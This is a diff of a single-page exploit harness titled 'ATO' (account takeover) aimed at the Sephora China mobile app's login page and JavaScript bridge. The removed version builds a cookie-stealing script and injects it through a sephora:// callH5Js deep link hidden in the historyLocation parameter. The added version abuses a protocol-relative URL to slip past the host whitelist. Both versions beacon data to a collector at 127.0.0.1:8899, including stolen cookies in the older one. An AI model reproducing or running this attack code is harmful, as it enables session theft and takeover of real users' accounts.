@@ -1,19 +1,17 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATO-v10</title></head>
+<title>ATO-v11</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
-<h3 style="color:#c9a96e">ATO v10 (login-page callH5Js)</h3>
+<h3 style="color:#c9a96e">ATO v11 (real in-place)</h3>
 <div id="log"></div>
 <script>
 window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
 function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,650)}
 B('load',location.href);
 if(typeof appHandler!=='undefined'){
-  // 偷cookie载荷: callH5Js 注入后跑在 sephora 源
-  var STEAL = "(function(){var c=document.cookie;new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(location.origin+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 13px monospace;word-break:break-all';d.textContent='ATO-WIN('+c.length+'): '+c.substring(0,160);document.body.appendChild(d)}catch(e){}})()";
-  var dl = 'sephora://foundation/callH5Js?method=' + encodeURIComponent(STEAL);
-  var target = 'https://m.sephora.cn/app/login?historyLocation=' + encodeURIComponent(dl);
-  B('nav',dl.substring(0,80));
-  document.getElementById('log').innerHTML='跳转登录页(historyLocation=callH5Js)...';
-  location.href = target;
+  // 协议相对URL: b()返回null(非http/https/sephora) + 白名单host匹配通过 → SOL redirect分支 → return false → 原地加载登录页
+  var target='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('//m.sephora.cn/');
+  B('nav','');
+  document.getElementById('log').innerHTML='原地跳转登录页...';
+  location.href=target;
 }else{B('nobridge','')}
 </script></body></html>
